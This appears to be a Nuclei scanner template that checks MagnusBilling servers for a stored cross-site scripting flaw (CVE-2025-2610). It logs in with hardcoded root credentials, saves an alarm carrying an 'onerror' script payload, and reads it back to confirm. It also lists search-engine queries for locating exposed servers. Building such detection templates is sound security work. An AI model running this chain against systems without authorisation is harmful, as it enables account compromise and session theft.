flow: http(1) && http(2) && http(3) && http(4)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "success")
    internal: true
    type: dsl
  raw:
  - 'POST /mbilling/index.php/authentication/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    user={{username}}&password={{password}}&key=

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "id_agent")
    internal: true
    type: dsl
  raw:
  - 'GET /mbilling/index.php/authentication/check?_dc= HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "Operation was successful")
    internal: true
    type: dsl
  raw:
  - 'POST /mbilling/index.php/alarm/save?_dc= HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded;


    rows={"id":0,"id_plan":0,"type":1,"amount":1,"condition":1,"status":1,"email":"{{email}}","period":3600,"creationdate":null,"subject":"test","message":"<img
    src=x onerror=alert(document.domain)>"}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "<img src=x onerror=alert(document.domain)>", "idPlanname")
    type: dsl
  raw:
  - 'GET /mbilling/index.php/alarm/read?_dc=&page=1&start=0&limit=25 HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2025-2610
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:magnussolution:magnusbilling:*:*:*:*:*:*:*:*
    cve-id: CVE-2025-2610
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N
    cvss-score: 7.6
    cwe-id: CWE-79
    epss-percentile: 0.84247
    epss-score: 0.02286
  description: 'Improper neutralization of input during web page generation vulnerability
    in MagnusSolution MagnusBilling (Alarm Module modules) allows authenticated stored
    cross-site scripting. This vulnerability is associated with program files protected/components/MagnusLog.Php.This
    issue affects MagnusBilling- through 7.3.0.

    '
  impact: 'Authenticated attackers can inject malicious HTML and JavaScript through
    the alarm module that persists and executes when other administrators view alarm
    configurations, potentially leading to session hijacking and privilege escalation.

    '
  metadata:
    fofa-query: body="magnusbilling"
    max-request: 1
    product: magnusbilling
    shodan-query: http.html:"magnusbilling"
    vendor: magnussolution
    verified: true
  name: MagnusBilling Alarm Module - Cross-Site Scripting
  reference:
  - https://vulncheck.com/advisories/magnusbilling-logs-xss
  - https://chocapikk.com/posts/2025/magnusbilling/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-2610
  remediation: 'Upgrade to MagnusBilling version 7.3.1 or later that properly sanitizes
    input in the alarm module.

    '
  severity: high
  tags: cve,cve2025,mbilling,xss,magnusbilling,authenticated,vkev,vuln
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  password: 9F4CA770B638615AC5C3E0D2DA16B77C80C2F2C6
  username: root
